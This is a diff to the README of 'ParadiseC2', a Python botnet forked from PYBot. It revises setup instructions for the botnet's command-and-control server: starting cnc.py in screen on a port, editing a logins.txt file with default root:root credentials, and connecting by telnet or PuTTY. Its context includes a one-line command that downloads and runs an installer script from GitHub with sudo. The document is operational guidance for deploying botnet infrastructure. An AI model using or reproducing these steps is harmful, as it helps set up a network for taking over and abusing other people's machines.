@@ -10,13 +10,22 @@ A python botnet forked from <a href="https://github.com/wodxgod/PYbot">PYBot</a>
   <pre><code>sudo apt install bash wget && wget https://raw.githubusercontent.com/d3fe4ted/ParadiseC2/main/installation.sh && sudo bash installation.sh</code></pre>
 
 # How to Setup
-  <p>(Inside ParadiseC2 folder) Enter this command</p>
-  <pre><code>screen python3</pre></code>
+  <div><p>(Inside ParadiseC2 folder) Enter this command</p>
+  <pre><code>screen python3 cnc.py (PORT)</pre></code>
   
-  <p>Make sure you change the username and password in the <code>logins.txt</code> file.</p>
-  <pre><code>sudo bash installation.sh</code></pre>
-  <li>Use telnet with the IP of your server and port in another terminal.</li>  
-  <pre><code>Example: telnet 198.245.61.217 (PORT)</code></pre></li>
+  <div><p>Make sure you change the username and password in the <code>logins.txt</code> file.</p>
+  <pre><code>root@oshere:~$ nano logins.txt
+---- GNU nano 5.4 -----------------------------------------------------------
+root:root
+.
+.
+.
+.
+.
+.
+ Once you changed these details press "CTRL + X" and then "Y" then "ENTER" on your keyboard</code></pre>
+  
+  <div><li>Use telnet with the IP of your server and port in another terminal or PuTTY</li>
   
 # How to stop screen
   <p>How to kill screen process</p>
